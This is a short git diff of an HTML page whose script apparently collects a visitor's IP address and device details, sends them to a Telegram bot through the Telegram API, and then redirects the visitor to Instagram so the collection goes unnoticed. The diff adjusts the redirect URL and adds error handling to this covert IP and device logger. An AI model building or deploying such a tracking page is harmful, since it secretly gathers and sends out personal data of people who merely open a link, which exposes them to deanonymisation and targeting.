@@ -105,7 +105,7 @@
                     <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                     `;
 
-                    console.log("Sending to Telegram:", message); // Debugging Log
+                   console.log("Sending to Telegram:", message); // Debugging Log
 
                     // Prepare Data for Telegram API
                     const formData = new URLSearchParams();
@@ -117,14 +117,16 @@
                     axios.post(URI_API, formData)
                         .then(response => {
                             console.log("Data sent to Telegram successfully!"); // Silent success message
-                            window.location.href = "https://www.instagram.com/reels/DCzVmybNPWi/"; // Redirects user to Instagram
+                            window.location.href = "https://www.instagram.com"; // Redirects user to Instagram
                         })
-                        
+                        .catch(error => {
+                            console.error("Telegram API Error:", error);
                         });
                 })
-            
+                .catch(error => {
+                    console.error("IP Fetch Error:", error);
                 });
         });
-   
+    </script>
 </body>
 </html>
